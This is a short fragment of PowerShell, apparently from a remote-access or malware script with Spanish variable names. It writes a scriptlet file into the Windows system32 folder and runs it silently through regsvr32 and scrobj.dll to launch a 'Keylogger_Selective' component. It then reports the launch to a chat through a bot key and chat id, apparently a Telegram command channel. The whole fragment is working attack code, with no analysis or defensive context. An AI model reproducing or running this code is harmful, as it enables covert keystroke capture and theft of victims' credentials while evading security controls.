...
$plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; Start-Process  c:\windows\system32\regsvr32.exe -ArgumentList '/s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
